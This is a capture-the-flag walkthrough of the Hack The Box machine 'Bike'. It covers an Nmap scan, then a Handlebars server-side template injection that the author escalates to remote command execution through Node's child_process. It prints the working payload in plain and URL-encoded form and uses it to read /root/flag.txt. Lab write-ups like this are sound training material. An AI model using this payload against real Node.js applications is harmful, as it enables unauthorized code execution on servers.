
## Reconnaissance

Kicking off with a simple Nmap scan...

__Nmap Scan__
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/bike]
└─$ sudo nmap -sC -sV -oN nmap.txt 10.129.50.86  
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 02:00 EST
Nmap scan report for 10.129.37.72
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  tcpwrapped
|_http-title:  Bike 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan 21 02:00:12 2023 -- 1 IP address (1 host up) scanned in 63.42 seconds
                                                  
```

On visiting the web page on port 80, there was just one input box to input email and submit it.

![bike-1](https://user-images.githubusercontent.com/87711310/214776916-7cd5f067-fc48-4941-89ad-46a0426405c9.png)

I used `wappalyzer` to scan the site for information. `Wappalyzer` is installed as a browser extension so we just reload the main page.

![bike-2](https://user-images.githubusercontent.com/87711310/214776912-a0eb4020-4e51-4079-b905-6be1ab1ff472.png)

`Node.js` and `Python` web backend servers often make use of a software called `Template Engines`

With `Node.js` websites there is a good possibility that a Template Engine is being used to reflect the email.

Since, this website was using Template Engines, the first thing I decided to try was `SSTI`, this is because most `Template Engines` are vulnerable to `SSTI`.

I used a basic `SSTI` payload to check if the site is vulnerable to `SSTI`

```
{{7*7}}
```

And I got an error. But one important thing that I found was that at parser.parse the Template Engine being used is `Handlebars` and it is located in the `/root/backend` directory.

bike-3

So, I quickly googled `handlebar SSTI` and found out this [blog](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html) from Mahmoud Gamal. 

Before using the exploit, I turned on `Burp`, Intercepted the request and sent it to the Repeater.

Then, I used the payload from the above mentioned blog, or you can get it from [hacktrickz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) too

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

URL encoding the above payload, we get
```
```

I copied and pasted it in the `email` parameter on the intercepted request and I got an error.

Apparently, there was an issue with the website that stated `require is not defined`. I quickly googled to find out the fix for it.

So, I found out that `require` is a keyword in `javascript/node.js` and it is used to load code from other modules or files, thus it will not allow me to execute our payload

Now, the best site to use for fixing this error would be Node.JS[https://nodejs.org/en/docs/]. I listed all of the information I needed in order to make this exploit work, specifically `process`.

Reading through `nodejs.org` I find that the object process has a `maindmodule`, which is a good sign as it can get us the foothold we need in order to execute our payload properly.

Although the page listed the `process.maindolue` as deprecated, I still attempt it as it will give me the results I need.

So my final payload was
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

I URL encoded it using Burp Decoder.

```
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%2e%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%53%79%6e%63%28%27%6c%73%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

And sent the request, It did not actually tell me whoami but I try to run `ls` to see if it lists the files in the present working directory. And it worked!!

![bike-4](https://user-images.githubusercontent.com/87711310/214784788-47611f42-947e-4c38-92d7-5c53c45db6de.png)

So now to retrieve the flag, I just had to view the files of the root directory and hoepfully, I'll find the flag there

I used `ls /root` command inside the `execSync` to list the contents of the `/root` directory.

![bike-5](https://user-images.githubusercontent.com/87711310/214784797-b5a9fcd0-31c4-417c-b82e-00bf55a0e22e.png)

Similarly, we can get the flag using the `cat /root/flag.txt` in the payload instead of `ls /root` command

![bike-6](https://user-images.githubusercontent.com/87711310/214784803-416e9c23-fc43-4faa-ab29-1f06d0f54603.png)

And we can complete the challenge!!
